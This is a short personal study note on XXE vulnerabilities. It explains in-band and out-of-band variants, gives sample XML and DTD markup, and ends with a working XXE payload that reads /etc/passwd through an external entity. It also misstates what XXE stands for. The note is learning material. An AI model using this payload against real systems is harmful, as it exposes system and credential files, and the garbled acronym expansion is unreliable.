# XXE

Rishabh Yadav | 06-02-2022

*Hi, I will be storing all my findings and learnings about this vulnerablity in this markdown file*

Full form - eXtinsible markup language

There are 2 types of this vulnerablity:-
1. Inband - Gives immediate response
2. Outband - Does not give any response. Attacker has to reflect the output of his XXE payload to a file or a web server

Here is a example of a xml code: 
```
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```
**mail** is the root element in the above code  

<br>

```
<text category = "message">You need to learn about XXE</text>
  
"category" is the attribute name and "message" is the attribute value
```

<br>

```

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>


___________________________


So now let's understand how that DTD validates the XML. Here's what all those terms used in note.dtd mean

    !DOCTYPE note -  Defines a root element of the document named note
    !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
    !ELEMENT to - Defines the to element to be of type "#PCDATA"
    !ELEMENT from - Defines the from element to be of type "#PCDATA"
    !ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
    !ELEMENT body - Defines the body element to be of type "#PCDATA"

    NOTE: #PCDATA means parseable character data.


```

<br>

Using the payload below we are able to read any file on the system: 
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```
Note: you must change the path of the file according to yourself


